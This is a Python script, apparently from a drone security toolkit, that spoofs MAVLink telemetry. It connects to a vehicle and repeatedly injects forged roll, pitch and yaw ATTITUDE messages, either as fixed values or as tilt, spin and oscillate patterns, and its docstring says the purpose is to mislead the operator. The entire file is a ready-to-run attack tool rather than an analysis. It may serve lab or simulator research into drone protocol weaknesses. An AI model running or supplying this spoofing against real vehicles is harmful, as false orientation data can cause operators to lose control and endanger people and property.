#!/usr/bin/env python3
"""
Attitude Spoofing Exploit Script
Injects false attitude data (roll, pitch, yaw) to mislead operator
"""

import sys
import time
import math
from pymavlink import mavutil

def inject_attitude_spoof(connection, roll=0.0, pitch=0.0, yaw=0.0, 
                         rollspeed=0.0, pitchspeed=0.0, yawspeed=0.0):
    """
    Inject spoofed attitude data
    
    Args:
        connection: MAVLink connection object
        roll: Roll angle in radians
        pitch: Pitch angle in radians
        yaw: Yaw angle in radians
        rollspeed: Roll angular speed in rad/s
        pitchspeed: Pitch angular speed in rad/s
        yawspeed: Yaw angular speed in rad/s
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    time_boot_ms = int(time.time() * 1e3) % 4294967295
    
    print(f"[*] Injecting attitude spoof:")
    print(f"    Roll: {math.degrees(roll):.1f}° ({roll:.3f} rad)")
    print(f"    Pitch: {math.degrees(pitch):.1f}° ({pitch:.3f} rad)")
    print(f"    Yaw: {math.degrees(yaw):.1f}° ({yaw:.3f} rad)")
    
    # Send ATTITUDE message
    connection.mav.attitude_send(
        time_boot_ms,
        roll,
        pitch,
        yaw,
        rollspeed,
        pitchspeed,
        yawspeed
    )
    
    print("[+] Attitude spoof injected")

def create_rotation_pattern(pattern='tilt', amplitude=0.5, frequency=0.1):
    """
    Create rotation pattern for continuous spoofing
    
    Args:
        pattern: Pattern type ('tilt', 'spin', 'oscillate')
        amplitude: Maximum angle in radians
        frequency: Frequency in Hz
    
    Returns:
        Generator function for (roll, pitch, yaw) tuples
    """
    t = 0.0
    
    while True:
        if pattern == 'tilt':
            # Tilt back and forth
            roll = amplitude * math.sin(2 * math.pi * frequency * t)
            pitch = amplitude * math.cos(2 * math.pi * frequency * t)
            yaw = 0.0
        elif pattern == 'spin':
            # Continuous yaw rotation
            roll = 0.0
            pitch = 0.0
            yaw = (2 * math.pi * frequency * t) % (2 * math.pi)
        elif pattern == 'oscillate':
            # Oscillate all axes
            roll = amplitude * math.sin(2 * math.pi * frequency * t)
            pitch = amplitude * math.sin(2 * math.pi * frequency * t + math.pi/3)
            yaw = amplitude * math.sin(2 * math.pi * frequency * t + 2*math.pi/3)
        else:
            roll = pitch = yaw = 0.0
        
        yield (roll, pitch, yaw)
        t += 0.1

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 attitude_spoofing.py <connection> [roll] [pitch] [yaw] [pattern]")
        print("Example: python3 attitude_spoofing.py udp:127.0.0.1:14550")
        print("Example: python3 attitude_spoofing.py udp:127.0.0.1:14550 0.5 0.3 1.0")
        print("Example: python3 attitude_spoofing.py udp:127.0.0.1:14550 0 0 0 tilt")
        print("\nPatterns: tilt, spin, oscillate")
        print("Angles are in radians (use --degrees flag for degrees)")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    use_degrees = '--degrees' in sys.argv
    
    # Parse and validate angles
    pattern = None
    roll = pitch = yaw = 0.0
    
    if len(sys.argv) > 2 and sys.argv[2] not in ['tilt', 'spin', 'oscillate']:
        try:
            roll = float(sys.argv[2])
            pitch = float(sys.argv[3]) if len(sys.argv) > 3 else 0.0
            yaw = float(sys.argv[4]) if len(sys.argv) > 4 else 0.0
            
            # Validate angle ranges (in degrees if specified, radians otherwise)
            if use_degrees:
                if not -180 <= roll <= 180:
                    raise ValueError("Roll must be between -180 and 180 degrees")
                if not -90 <= pitch <= 90:
                    raise ValueError("Pitch must be between -90 and 90 degrees")
                if not -180 <= yaw <= 180:
                    raise ValueError("Yaw must be between -180 and 180 degrees")
                roll = math.radians(roll)
                pitch = math.radians(pitch)
                yaw = math.radians(yaw)
            else:
                # Validate in radians (roughly -3.14 to 3.14)
                if not -math.pi <= roll <= math.pi:
                    raise ValueError("Roll must be between -π and π radians")
                if not -math.pi/2 <= pitch <= math.pi/2:
                    raise ValueError("Pitch must be between -π/2 and π/2 radians")
                if not -math.pi <= yaw <= math.pi:
                    raise ValueError("Yaw must be between -π and π radians")
        except (ValueError, TypeError, IndexError) as e:
            print(f"[-] Invalid angle: {e}")
            sys.exit(1)
    else:
        pattern = sys.argv[2] if len(sys.argv) > 2 else 'tilt'
        if pattern not in ['tilt', 'spin', 'oscillate']:
            print(f"[-] Unknown pattern: {pattern}")
            print("[*] Valid patterns: tilt, spin, oscillate")
            sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Inject attitude spoof
    if pattern:
        print(f"[*] Running {pattern} pattern (Press Ctrl+C to stop)...")
        pattern_gen = create_rotation_pattern(pattern)
        try:
            while True:
                roll, pitch, yaw = next(pattern_gen)
                inject_attitude_spoof(connection, roll, pitch, yaw)
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[*] Stopping attitude spoofing...")
    else:
        print("[*] Injecting attitude spoof (Press Ctrl+C to stop)...")
        try:
            while True:
                inject_attitude_spoof(connection, roll, pitch, yaw)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping attitude spoofing...")

if __name__ == "__main__":
    main()
